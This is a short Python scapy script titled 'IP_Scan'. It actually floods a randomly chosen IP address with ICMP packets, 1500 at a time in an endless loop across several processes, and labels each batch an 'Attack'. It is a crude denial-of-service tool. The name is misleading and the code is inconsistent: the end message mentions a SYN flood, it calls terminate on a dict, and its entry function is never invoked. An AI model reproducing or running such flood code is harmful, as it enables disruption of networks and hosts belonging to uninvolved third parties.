import scapy.all as scapy
import os
from multiprocessing import Pool

clear = os.system('clear')
print("**************************************")
print("            IP_Scan")
print("**************************************")

p={}

def IP_Scan_End():
	print("SYN_Flood_End!")
	p.terminate()

def IP_Scan(name):

	num =0
	dst_ip = scapy.RandIP()
	#src_ip ="123.123.123."+str(name)

	try:
		while True:
			packet = scapy.IP(dst=dst_ip)/scapy.ICMP()
			scapy.send(packet,count=1500,verbose=False)
			num +=1
			print("Process:%s,Attack:%s"%(name,num))
	except KeyboardInterrupt:
		print("Go back")

def process():
	global p
	p = Pool(2)
	for i in range(3):
		p.apply_async(IP_Scan,args=(i,))
	print("Waiting for all subprocesses done....")
	p.close()
	p.join()
	print("All subprocesses done")
	
